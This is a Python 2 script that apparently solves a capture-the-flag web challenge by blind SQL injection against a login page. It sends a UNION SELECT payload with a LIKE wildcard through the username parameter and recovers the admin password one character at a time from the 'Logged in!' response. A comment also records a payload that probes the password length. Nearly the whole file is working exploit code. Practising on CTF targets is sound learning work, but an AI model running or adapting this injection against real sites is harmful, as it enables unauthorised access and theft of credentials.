import urllib2, sys

SERVER = "http://stuyctf.me/php/SQLi/login.php"
UNION = "\' UNION SELECT * from users where username = \"admin\" AND password LIKE \"" # password LIKE means if the password contains a value
ALL = "%\" -- " # Basically *, anything can take place of %

# Connect to the site
def connect(username , password , flag , letter):
    URL = SERVER + "?username=" + username + "&password=" + password
    URL = URL.replace(" " , "%20") # Replace spaces with url encoded equivalent
    request = urllib2.Request(URL , "")
    output = urllib2.urlopen(request).read()
    if "Logged in!" in output:
        flag += letter
    return flag

# Acquired password by playing around with
# admin ' AND CHAR_LENGTH(password)>43 -- &password=

letters = "abcdefhgijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
# Crack all possible passwords with given letters
def crack():
    flag = ""
    for i in range(0 , 44): # Playing around a bit revealed that the password length is 44
        for letter in letters:
            flagAlt = flag
            flag = connect(UNION + flag + letter + ALL , "" , flag , letter)
            if (flagAlt != flag): # Detect a change in the flag
                print flag # So we can see whats going on
                break
    print "Got the flag! " + flag

crack()
